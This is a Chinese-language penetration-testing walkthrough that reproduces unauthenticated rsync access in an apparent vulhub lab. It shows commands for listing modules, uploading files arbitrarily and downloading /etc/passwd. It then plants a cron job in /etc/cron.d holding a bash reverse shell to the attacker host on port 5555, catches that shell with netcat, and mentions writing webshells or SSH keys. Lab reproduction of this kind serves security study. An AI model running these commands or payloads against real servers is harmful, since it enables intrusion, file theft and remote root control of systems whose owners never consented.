# 0x00 Rsync简介
Rsync是Linux下一款数据备份工具，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。同时支持通过rsync协议、ssh协议进行远程文件传输。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。

rsync协议默认监听873端口，而一般开发人员安全意识薄弱的情况下，如果目标开启了rsync服务，并且没有配置ACL或访问密码，而rsync默认是root权限，我们将可以读写目标服务器文件。

rsync默认配置文件为`/etc/rsyncd.conf`

常驻模式启动命令`rsync --no-detach --daemon --config /etc/rsyncd.conf`

启动成功后默认监听于TCP端口`873`，可通过`rsync-daemon`及`ssh`两种方式进行认证。

# 0x01 环境搭建
https://github.com/vulhub/vulhub/tree/master/rsync/common

靶机：192.168.50.227

攻击机：192.168.50.53

# 0x02 利用条件
rsync默认允许匿名访问，其配置文件 `/etc/rsyncd.conf` 中未包含授权账号行(auth users)，则为匿名访问。

# 0x03 利用方式
## 3.1 访问rsync服务器
```
rsync rsync://192.168.50.227:873/
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117427-bd3f4f94-c599-4420-bec3-775b12baaae0.png" /></div>


## 3.2 查看模块列表
```
rsync rsync://192.168.50.227:873/src
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117520-64f525d8-898c-4d28-a6dc-7c9eb3be59fa.png" /></div>


## 3.3 任意文件上传
```
rsync 1.txt rsync://192.168.50.227:873/src/home/
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117635-cac68364-3bb5-4273-9db0-bc4907be5b2b.png" /></div>


## 3.4 任意文件下载
```
rsync rsync://192.168.50.227:873/src/etc/passwd /tmp
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117683-7e3fa3d8-eb6c-47d4-bc56-89ecd6d8150f.png" /></div>

## 3.5 通过写cron任务反弹shell
在cron.d增加定时任务
当我们要增加全局性的计划任务时，一种方式是直接修改`/etc/crontab`。但是，一般不建议这样做，`/etc/cron.d/`目录就是为了解决这种问题而创建的。

cron 执行时，要读取三个地方的配置文件：一是`/etc/crontab`，二是`/etc/cron.d`目录下的所有文件，三是每个用户的配置文件。

所以cron进程执行时，就会自动扫描`/etc/cron.d/`目录下的所有文件，按照文件中的时间设定执行后面的命令。

1、在本地编辑一个`crontab`文件
```
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*  *    * * *   root    bash -c "bash -i >& /dev/tcp/192.168.50.53/5555 0>&1"
#
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117742-a1b71c74-a13d-4308-a9ad-d94f289f613c.png" /></div>

2、上传crontab文件到靶机的`/etc/cron.d/`目录下
```
rsync -av /tmp/crontab rsync://192.168.50.227:873/src/etc/cron.d/
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117820-2873a1f2-1b7f-401a-9e0e-64668641160d.png" /></div>


3、kali监听5555端口，等待计划任务执行后反弹shell成功
```
nc -lvvp 5555
```

<div align=center><img src="https://user-images.githubusercontent.com/84888757/175117863-0678c5a3-aacc-4f78-916e-e354b0be9d9f.png" /></div>


🚩 此外如果目标有Web服务的话，可以直接写WebShell，或者可以通过写ssh公钥实现获取权限。

# 0x04 参考链接
- https://github.com/vulhub/vulhub/tree/master/rsync/common
- [rsync未授权访问漏洞利用复现](https://baijiahao.baidu.com/s?id=1672329601503704665&wfr=spider&for=pc)
- [Linux /etc/cron.d作用](https://blog.csdn.net/weixin_42308335/article/details/116924900)
- [rsync的几则tips（渗透技巧）](https://blog.csdn.net/kclax/article/details/93207941)


